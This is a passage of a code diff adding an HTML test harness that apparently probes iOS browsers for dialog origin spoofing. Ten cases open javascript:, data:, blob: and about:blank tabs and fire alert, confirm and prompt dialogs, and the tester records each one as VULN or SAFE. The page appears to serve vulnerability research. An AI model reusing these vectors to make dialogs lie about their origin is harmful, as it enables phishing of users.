+    if (!isOpen) {
+      body.classList.add('open');
+      header.classList.add('open');
+    }
+  }
+
+  function recordResult(result) {
+    if (!lastRanTC) {
+      log('No test run yet — run a test first then record result.', 'err');
+      return;
+    }
+    const el = document.getElementById('r-' + lastRanTC);
+    if (el) {
+      el.textContent = result === 'vuln' ? '❌ VULN' : '✅ SAFE';
+      el.className = 'rt-result ' + result;
+      log('Recorded ' + lastRanTC + ' as ' + (result === 'vuln' ? 'VULNERABLE' : 'SAFE'), result === 'vuln' ? 'err' : 'ok');
+    }
+  }
+
+  function runTest(tc) {
+    lastRanTC = tc;
+    log('Running ' + tc.toUpperCase() + ' ...', 'info');
+
+    try {
+      switch(tc) {
+
+        case 'ios01':
+          window.open(
+            'javascript:alert("iOS01\\ndoc.domain: "+document.domain+"\\nwin.origin: "+window.origin)'
+          );
+          log('iOS01: javascript: tab opened. Check sheet origin label.', 'ok');
+          break;
+
+        case 'ios02': {
+          const w2 = window.open('data:,Hello');
+          log('iOS02: data: tab opened. Dialog fires in 800ms...', 'info');
+          setTimeout(() => {
+            try {
+              w2.alert('iOS02 cross-tab\niframe: ' + myOrigin);
+              log('iOS02: win.alert() fired. Check sheet.', 'ok');
+            } catch(e) { log('iOS02 error: ' + e.message, 'err'); }
+          }, 800);
+          break;
+        }
+
+        case 'ios03': {
+          const w3 = window.open('data:,Hello');
+          log('iOS03: confirm() fires in 800ms...', 'info');
+          setTimeout(() => {
+            try {
+              w3.confirm('iOS03 confirm()\niframe: ' + myOrigin);
+              log('iOS03: confirm() fired. Check sheet.', 'ok');
+            } catch(e) { log('iOS03 error: ' + e.message, 'err'); }
+          }, 800);
+          break;
+        }
+
+        case 'ios04': {
+          const w4 = window.open('data:,Hello');
+          log('iOS04: prompt() fires in 800ms...', 'info');
+          setTimeout(() => {
+            try {
+              w4.prompt('iOS04 prompt()\niframe: ' + myOrigin, '');
+              log('iOS04: prompt() fired. Check sheet + keyboard.', 'ok');
+            } catch(e) { log('iOS04 error: ' + e.message, 'err'); }
+          }, 800);
+          break;
+        }
+
+        case 'ios05': {
+          const html = `<script>alert('iOS05 Blob\\nCreator: ${myOrigin}\\nwin.origin: '+window.origin);<\/script>`;
+          const blob = new Blob([html], {type: 'text/html'});
+          window.open(URL.createObjectURL(blob));
+          log('iOS05: Blob URL tab opened. Check sheet origin.', 'ok');
+          break;
+        }
+
+        case 'ios06': {
+          const w6 = window.open('about:blank#ios-test');
+          log('iOS06: about:blank#hash opened. Dialog in 800ms...', 'info');
+          setTimeout(() => {
+            try {
+              w6.alert('iOS06 about:blank#hash\niframe: ' + myOrigin);
+              log('iOS06: alert fired. Check sheet.', 'ok');
+            } catch(e) { log('iOS06 error: ' + e.message, 'err'); }
+          }, 800);
+          break;
+        }
+
+        case 'ios07': {
+          const w7 = window.open('data:,Hello');
+          try {
+            w7.alert('iOS07 immediate (no setTimeout)\niframe: ' + myOrigin);
+            log('iOS07: Immediate alert fired. Check sheet.', 'ok');
+          } catch(e) {
+            log('iOS07: Blocked/error (expected): ' + e.message, 'err');
+          }
+          break;
+        }
+
+        case 'ios08': {
+          const w8 = window.open('data:,First');
+          log('iOS08: First nav opened. Second nav in 800ms...', 'info');
+          setTimeout(() => {
+            w8.location.href = 'data:,Second';
+            log('iOS08: Second nav done. Dialog in 800ms...', 'info');
+            setTimeout(() => {
+              try {
+                w8.alert('iOS08 after 2nd nav\niframe: ' + myOrigin);
+                log('iOS08: Dialog fired after 2nd nav. Check sheet.', 'ok');
+              } catch(e) { log('iOS08 error: ' + e.message, 'err'); }
+            }, 800);
+          }, 800);
+          break;
+        }
+
+        case 'ios09': {
+          const w9 = window.open('javascript:void(0)');
+          log('iOS09: void(0) tab opened. Dialog in 800ms...', 'info');
+          setTimeout(() => {
+            try {
+              w9.alert('iOS09 void(0)\niframe: ' + myOrigin);
+              log('iOS09: alert fired. Check sheet.', 'ok');
+            } catch(e) { log('iOS09 error: ' + e.message, 'err'); }
+          }, 800);
+          break;
+        }
+
+        case 'ios10': {
+          const w10 = window.open('data:,Hello');
+          log('iOS10: Tab opened. Setting beforeunload in 800ms...', 'info');
+          setTimeout(() => {
+            w10.onbeforeunload = () => 'iOS10 beforeunload — check origin label';
+            setTimeout(() => {
+              w10.location.href = 'about:blank';
+              log('iOS10: Navigation triggered. beforeunload may be suppressed on iOS.', 'info');
+            }, 400);
+          }, 800);
+          break;
+        }
+
+        default:
+          log('Unknown test: ' + tc, 'err');
+      }
+    } catch(e) {
+      log('Uncaught error in ' + tc + ': ' + e.message, 'err');
+    }
+  }
+
+  // Open first card by default
+  document.querySelectorAll('.tc-head')[0].click();
+</script>
+</body>
+</html>
